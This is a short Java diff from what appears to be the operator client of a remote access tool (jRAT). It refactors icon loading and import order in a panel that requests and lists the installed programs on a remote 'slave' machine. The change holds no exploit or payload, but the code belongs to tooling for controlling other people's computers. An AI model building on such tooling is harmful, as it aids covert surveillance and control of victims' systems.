@@ -15,12 +15,12 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
-import com.redpois0n.oslib.OperatingSystem;
-
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet81InstalledPrograms;
 import se.jrat.client.ui.renderers.JComboBoxIconRenderer;
 import se.jrat.client.utils.IconUtils;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 @SuppressWarnings("serial")
@@ -55,7 +55,7 @@ public class PanelControlInstalledPrograms extends PanelControlParent {
 				slave.addToSendQueue(new Packet81InstalledPrograms(location));
 			}
 		});
-		btnReload.setIcon(new ImageIcon(PanelControlInstalledPrograms.class.getResource("/icons/update.png")));
+		btnReload.setIcon(IconUtils.getIcon("update"));
 
 		JButton btnClear = new JButton("Clear");
 		btnClear.addActionListener(new ActionListener() {
@@ -63,7 +63,7 @@ public class PanelControlInstalledPrograms extends PanelControlParent {
 				clear();
 			}
 		});
-		btnClear.setIcon(new ImageIcon(PanelControlInstalledPrograms.class.getResource("/icons/clear.png")));
+		btnClear.setIcon(IconUtils.getIcon("clear"));
 
 		comboBox = new JComboBox<String>();
 		comboBox.setVisible(slave.getOS() == OperatingSystem.WINDOWS);
